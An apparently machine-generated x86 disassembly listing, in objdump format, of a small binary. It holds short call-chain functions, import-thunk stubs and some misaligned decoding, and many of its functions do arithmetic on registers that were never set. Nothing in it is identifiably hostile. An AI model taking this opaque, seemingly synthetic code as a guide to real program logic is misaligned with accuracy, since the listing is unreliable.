  4d10d2:	pop    ecx
  4d10d3:	add    esp,0x40
  4d10d6:	pop    ebp
  4d10d7:	ret    
  4d10d8:	mov    edi,edi
  4d10da:	push   ebp
  4d10db:	mov    ebp,esp
  4d10dd:	sub    esp,0x2c
  4d10e0:	mov    edx,0x4d3070
  4d10e5:	xor    ecx,DWORD PTR [edx+0x48]
  4d10e8:	push   edx
  4d10e9:	push   DWORD PTR [edx+0x44]
  4d10ec:	push   DWORD PTR [edx+0x24]
  4d10ef:	push   DWORD PTR [edx+0x15c]
  4d10f5:	push   ecx
  4d10f6:	call   0x4d0bd4
  4d10fb:	add    esp,0x10
  4d10fe:	pop    edx
  4d10ff:	push   edx
  4d1100:	mov    ecx,0x0
  4d1105:	push   ecx
  4d1106:	call   0x4d0b2c
  4d110b:	add    esp,0x4
  4d110e:	pop    edx
  4d110f:	push   edx
  4d1110:	mov    esi,0xfffffff4
  4d1115:	push   esi
  4d1116:	call   0x4d13c4
  4d111b:	add    esp,0x4
  4d111e:	pop    edx
  4d111f:	add    esp,0x2c
  4d1122:	pop    ebp
  4d1123:	ret    
  4d1124:	pop    edi
  4d1125:	call   DWORD PTR ds:0x4d2018
  4d112b:	call   edi
  4d112d:	add    BYTE PTR [eax],al
  4d112f:	add    BYTE PTR [edi-0x1],bl
  4d1132:	adc    eax,0x4d2044
  4d1137:	call   edi
  4d1139:	add    BYTE PTR [eax],al
  4d113b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1141:	sub    esp,0x38
  4d1144:	lea    edi,[eax+0x8c]
  4d114a:	cmp    edi,0xd7d
  4d1150:	jbe    0x4d113f
  4d1152:	push   edi
  4d1153:	push   DWORD PTR [edi+0x164]
  4d1159:	push   DWORD PTR [edi+0x1d4]
  4d115f:	push   eax
  4d1160:	push   ebx
  4d1161:	call   0x4d0928
  4d1166:	add    esp,0x10
  4d1169:	pop    edi
  4d116a:	push   edi
  4d116b:	call   0x4d14f8
  4d1170:	add    esp,0x4
  4d1173:	pop    edi
  4d1174:	push   edi
  4d1175:	push   0x0
  4d1177:	call   0x4d1130
  4d117c:	add    esp,0x4
  4d117f:	pop    edi
  4d1180:	add    esp,0x38
  4d1183:	pop    ebp
  4d1184:	ret    
  4d1185:	add    BYTE PTR [eax],al
  4d1187:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d118d:	sub    esp,0x3c
  4d1190:	lea    ebx,[ecx-0xc0]
  4d1196:	sub    esi,ecx
  4d1198:	mov    edx,0x0
  4d119d:	push   edx
  4d119e:	call   0x4d1504
  4d11a3:	add    esp,0x4
  4d11a6:	push   ebx
  4d11a7:	push   DWORD PTR [ebx+0x90]
  4d11ad:	push   DWORD PTR [ebx+0x194]
  4d11b3:	push   DWORD PTR [ebx+0x134]
  4d11b9:	call   0x4d0e70
  4d11be:	add    esp,0xc
  4d11c1:	pop    ebx
  4d11c2:	mov    esi,0xfffffff4
  4d11c7:	push   esi
  4d11c8:	call   0x4d13c4
  4d11cd:	add    esp,0x4
  4d11d0:	add    esp,0x3c
  4d11d3:	pop    ebp
  4d11d4:	ret    
  4d11d5:	add    BYTE PTR [eax],al
  4d11d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11dd:	sub    esp,0x30
  4d11e0:	lea    ebx,ds:0x4d3108
  4d11e6:	add    ecx,esi
  4d11e8:	push   ebx
  4d11e9:	push   DWORD PTR [ebx+0xfc]
  4d11ef:	push   DWORD PTR [ebx+0xf0]
  4d11f5:	push   DWORD PTR [ebx+0xb4]
  4d11fb:	push   DWORD PTR [ebx+0x194]
  4d1201:	call   0x4d149c
  4d1206:	add    esp,0x10
  4d1209:	pop    ebx
  4d120a:	mov    edi,0x0
  4d120f:	push   edi
  4d1210:	call   0x4d15e4
  4d1215:	add    esp,0x4
  4d1218:	push   0x0
  4d121a:	call   0x4d0728
  4d121f:	add    esp,0x4
  4d1222:	add    esp,0x30
  4d1225:	pop    ebp
  4d1226:	ret    
  4d1227:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d122d:	sub    esp,0x24
  4d1230:	lea    edx,[ecx-0x14c]
  4d1236:	cmp    edx,0x3fbd
  4d123c:	jb     0x4d122b
  4d123e:	push   edx
  4d123f:	mov    eax,0x0
  4d1244:	push   eax
  4d1245:	call   0x4d0c9c
  4d124a:	add    esp,0x4
  4d124d:	pop    edx
  4d124e:	push   edx
  4d124f:	push   DWORD PTR [edx+0x1b8]
  4d1255:	push   esi
  4d1256:	push   DWORD PTR [edx+0x1e4]
  4d125c:	call   0x4d0f10
  4d1261:	add    esp,0xc
  4d1264:	pop    edx
  4d1265:	push   edx
  4d1266:	call   0x4d09bc
  4d126b:	add    esp,0x4
  4d126e:	pop    edx
  4d126f:	add    esp,0x24
  4d1272:	pop    ebp
  4d1273:	ret    
  4d1274:	pop    edi
  4d1275:	call   DWORD PTR ds:0x4d209c
  4d127b:	call   edi
  4d127d:	add    BYTE PTR [eax],al
  4d127f:	add    BYTE PTR [edi-0x1],bl
  4d1282:	adc    eax,0x4d2024
  4d1287:	call   edi
  4d1289:	add    BYTE PTR [eax],al
  4d128b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1291:	sub    esp,0x38
  4d1294:	mov    edx,0x4d3090
  4d1299:	cmp    edx,0x152b
  4d129f:	jbe    0x4d128f
  4d12a1:	push   edx
  4d12a2:	push   0x0
  4d12a4:	call   0x4d15e4
  4d12a9:	add    esp,0x4
  4d12ac:	pop    edx
  4d12ad:	push   edx
  4d12ae:	push   esi
  4d12af:	push   esi
  4d12b0:	push   DWORD PTR [edx+0xa8]
  4d12b6:	call   0x4d1324
  4d12bb:	add    esp,0xc
  4d12be:	pop    edx
  4d12bf:	push   edx
  4d12c0:	call   0x4d09bc
  4d12c5:	add    esp,0x4
  4d12c8:	pop    edx
  4d12c9:	add    esp,0x38
  4d12cc:	pop    ebp
  4d12cd:	ret    
  4d12ce:	add    BYTE PTR [eax],al
  4d12d0:	pop    edi
  4d12d1:	call   DWORD PTR ds:0x4d2054
  4d12d7:	call   edi
  4d12d9:	add    BYTE PTR [eax],al
  4d12db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12e1:	sub    esp,0x34
  4d12e4:	mov    eax,0x4d30dc
  4d12e9:	xor    DWORD PTR [ebp-0x30],0x1fa1
  4d12f0:	push   eax
  4d12f1:	push   edx
  4d12f2:	push   ecx
  4d12f3:	call   0x4d140c
  4d12f8:	add    esp,0x8
  4d12fb:	pop    eax
  4d12fc:	push   eax
  4d12fd:	mov    edx,0xfffffff4
  4d1302:	push   edx
  4d1303:	call   0x4d13c4
  4d1308:	add    esp,0x4
  4d130b:	pop    eax
  4d130c:	push   eax
  4d130d:	mov    edx,0xfffffff4
  4d1312:	push   edx
  4d1313:	call   0x4d13c4
  4d1318:	add    esp,0x4
  4d131b:	pop    eax
  4d131c:	add    esp,0x34
  4d131f:	pop    ebp
  4d1320:	ret    
  4d1321:	add    BYTE PTR [eax],al
  4d1323:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1329:	sub    esp,0x4c
  4d132c:	lea    ebx,[edx+0xf8]
  4d1332:	sub    DWORD PTR [ebx+0x4c],ebx
  4d1335:	push   0x0
  4d1337:	call   0x4d1130
  4d133c:	add    esp,0x4
  4d133f:	push   ebx
  4d1340:	push   DWORD PTR [ebx+0x118]
  4d1346:	push   DWORD PTR [ebx+0xd8]
  4d134c:	push   DWORD PTR [ebx+0x1fc]
  4d1352:	push   DWORD PTR [ebx+0x40]
  4d1355:	call   0x4d09d4
  4d135a:	add    esp,0x10
  4d135d:	pop    ebx
  4d135e:	push   0xfffffff4
  4d1360:	call   0x4d13c4
  4d1365:	add    esp,0x4
  4d1368:	add    esp,0x4c
  4d136b:	pop    ebp
  4d136c:	ret    
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1375:	sub    esp,0x38
  4d1378:	mov    eax,0x4d3030
  4d137d:	and    esi,DWORD PTR [eax+0x154]
  4d1383:	push   eax
  4d1384:	push   0x0
  4d1386:	call   0x4d1130
  4d138b:	add    esp,0x4
  4d138e:	pop    eax
  4d138f:	push   eax
  4d1390:	push   DWORD PTR [eax+0x108]
  4d1396:	push   edx
  4d1397:	push   DWORD PTR [eax+0x15c]
  4d139d:	push   DWORD PTR [eax+0x104]
  4d13a3:	call   0x4d10d8
  4d13a8:	add    esp,0x10
  4d13ab:	pop    eax
  4d13ac:	push   eax
  4d13ad:	mov    eax,0xfffffff4
  4d13b2:	push   eax
  4d13b3:	call   0x4d13c4
  4d13b8:	add    esp,0x4
  4d13bb:	pop    eax
  4d13bc:	add    esp,0x38
  4d13bf:	pop    ebp
  4d13c0:	ret    
  4d13c1:	add    BYTE PTR [eax],al
  4d13c3:	add    BYTE PTR [edi-0x1],bl
  4d13c6:	adc    eax,0x4d2034
  4d13cb:	call   edi
  4d13cd:	add    BYTE PTR [eax],al
  4d13cf:	add    BYTE PTR [edi-0x1],bl
  4d13d2:	adc    eax,0x4d205c
  4d13d7:	call   edi
  4d13d9:	add    BYTE PTR [eax],al
  4d13db:	add    BYTE PTR [edi-0x1],bl
  4d13de:	adc    eax,0x4d203c
  4d13e3:	call   edi
  4d13e5:	add    BYTE PTR [eax],al
  4d13e7:	add    BYTE PTR [edi-0x1],bl
  4d13ea:	adc    eax,0x4d2014
  4d13ef:	call   edi
  4d13f1:	add    BYTE PTR [eax],al
  4d13f3:	add    BYTE PTR [edi-0x1],bl
  4d13f6:	adc    eax,0x4d2098
  4d13fb:	call   edi
  4d13fd:	add    BYTE PTR [eax],al
  4d13ff:	add    BYTE PTR [edi-0x1],bl
  4d1402:	adc    eax,0x4d2064
  4d1407:	call   edi
  4d1409:	add    BYTE PTR [eax],al
  4d140b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1411:	sub    esp,0x30
  4d1414:	mov    esi,0x4d3188
  4d1419:	sbb    ebx,DWORD PTR [esi-0x54]
  4d141c:	push   esi
  4d141d:	push   DWORD PTR [esi+0x64]
  4d1420:	push   DWORD PTR [esi+0xec]
  4d1426:	call   0x4d104c
  4d142b:	add    esp,0x8
  4d142e:	pop    esi
  4d142f:	push   0x0
  4d1431:	call   0x4d1504
  4d1436:	add    esp,0x4
  4d1439:	mov    edi,0x0
  4d143e:	push   edi
  4d143f:	call   0x4d1130
  4d1444:	add    esp,0x4
  4d1447:	add    esp,0x30
  4d144a:	pop    ebp
  4d144b:	ret    
  4d144c:	mov    edi,edi
  4d144e:	push   ebp
  4d144f:	mov    ebp,esp
  4d1451:	sub    esp,0x48
  4d1454:	lea    edi,[ebx-0x20]
  4d1457:	or     edx,eax
  4d1459:	push   edi
  4d145a:	mov    edx,0x0
  4d145f:	push   edx
  4d1460:	call   0x4d1130
  4d1465:	add    esp,0x4
  4d1468:	pop    edi
  4d1469:	push   edi
  4d146a:	push   ebx
  4d146b:	push   DWORD PTR [edi+0x98]
  4d1471:	push   esi
  4d1472:	call   0x4d0b38
  4d1477:	add    esp,0xc
  4d147a:	pop    edi
  4d147b:	push   edi
  4d147c:	mov    ebx,0x0
  4d1481:	push   ebx
  4d1482:	call   0x4d0b2c
  4d1487:	add    esp,0x4
  4d148a:	pop    edi
  4d148b:	add    esp,0x48
  4d148e:	pop    ebp
  4d148f:	ret    
  4d1490:	pop    edi
  4d1491:	call   DWORD PTR ds:0x4d2048
  4d1497:	call   edi
  4d1499:	add    BYTE PTR [eax],al
  4d149b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a1:	sub    esp,0x58
  4d14a4:	lea    eax,ds:0x4d31ac
  4d14aa:	sub    DWORD PTR [eax+0x4],0x1f
  4d14ae:	push   eax
  4d14af:	push   0x0
  4d14b1:	call   0x4d0b2c
  4d14b6:	add    esp,0x4
  4d14b9:	pop    eax
  4d14ba:	push   eax
  4d14bb:	push   esi
  4d14bc:	push   ebx
  4d14bd:	push   ebx
  4d14be:	push   DWORD PTR [eax+0x168]
  4d14c4:	call   0x4d0c38
  4d14c9:	add    esp,0x10
  4d14cc:	pop    eax
  4d14cd:	push   eax
  4d14ce:	push   0x0
  4d14d0:	call   0x4d15e4
  4d14d5:	add    esp,0x4
  4d14d8:	pop    eax
  4d14d9:	add    esp,0x58
  4d14dc:	pop    ebp
  4d14dd:	ret    
  4d14de:	add    BYTE PTR [eax],al
  4d14e0:	pop    edi
  4d14e1:	call   DWORD PTR ds:0x4d2008
  4d14e7:	call   edi
  4d14e9:	add    BYTE PTR [eax],al
  4d14eb:	add    BYTE PTR [edi-0x1],bl
  4d14ee:	adc    eax,0x4d2070
  4d14f3:	call   edi
  4d14f5:	add    BYTE PTR [eax],al
  4d14f7:	add    BYTE PTR [edi-0x1],bl
  4d14fa:	adc    eax,0x4d2038
  4d14ff:	call   edi
  4d1501:	add    BYTE PTR [eax],al
  4d1503:	add    BYTE PTR [edi-0x1],bl
  4d1506:	adc    eax,0x4d2028
  4d150b:	call   edi
  4d150d:	add    BYTE PTR [eax],al
  4d150f:	add    BYTE PTR [edi-0x1],bl
  4d1512:	adc    eax,0x4d2074
  4d1517:	call   edi
  4d1519:	add    BYTE PTR [eax],al
  4d151b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1521:	sub    esp,0x54
  4d1524:	lea    edx,ds:0x4d3104
  4d152a:	adc    ebx,edi
  4d152c:	push   edx
  4d152d:	push   0x0
  4d152f:	call   0x4d101c
  4d1534:	add    esp,0x4
  4d1537:	pop    edx
  4d1538:	push   edx
  4d1539:	push   ecx
  4d153a:	push   eax
  4d153b:	call   0x4d0fd0
  4d1540:	add    esp,0x8
  4d1543:	pop    edx
  4d1544:	push   edx
  4d1545:	mov    ebx,0x0
  4d154a:	push   ebx
  4d154b:	call   0x4d101c
  4d1550:	add    esp,0x4
  4d1553:	pop    edx
  4d1554:	add    esp,0x54
  4d1557:	pop    ebp
  4d1558:	ret    
  4d1559:	add    BYTE PTR [eax],al
  4d155b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1561:	sub    esp,0x24
  4d1564:	mov    esi,0x4d3120
  4d1569:	and    edi,edx
  4d156b:	push   esi
  4d156c:	push   DWORD PTR [esi+0xc4]
  4d1572:	push   eax
  4d1573:	push   DWORD PTR [esi+0x154]
  4d1579:	push   DWORD PTR [esi+0x1f0]
  4d157f:	call   0x4d0ae0
  4d1584:	add    esp,0x10
  4d1587:	pop    esi
  4d1588:	push   0x0
  4d158a:	call   0x4d0b2c
  4d158f:	add    esp,0x4
  4d1592:	push   0x0
  4d1594:	call   0x4d0b2c
  4d1599:	add    esp,0x4
  4d159c:	add    esp,0x24
  4d159f:	pop    ebp
  4d15a0:	ret    
  4d15a1:	add    BYTE PTR [eax],al
  4d15a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d15a9:	sub    esp,0x5c
  4d15ac:	lea    edx,ds:0x4d3194
  4d15b2:	add    ebx,DWORD PTR [edx-0xec]
  4d15b8:	push   edx
  4d15b9:	push   0x0
  4d15bb:	call   0x4d1130
  4d15c0:	add    esp,0x4
  4d15c3:	pop    edx
  4d15c4:	push   edx
  4d15c5:	push   ebx
  4d15c6:	push   DWORD PTR [edx+0x1dc]
  4d15cc:	call   0x4d0734
  4d15d1:	add    esp,0x8
  4d15d4:	pop    edx
  4d15d5:	push   edx
  4d15d6:	call   0x4d09bc
  4d15db:	add    esp,0x4
  4d15de:	pop    edx
  4d15df:	add    esp,0x5c
  4d15e2:	pop    ebp
  4d15e3:	ret    
  4d15e4:	pop    edi
  4d15e5:	call   DWORD PTR ds:0x4d200c
  4d15eb:	call   edi
  4d15ed:	add    BYTE PTR [eax],al
	...
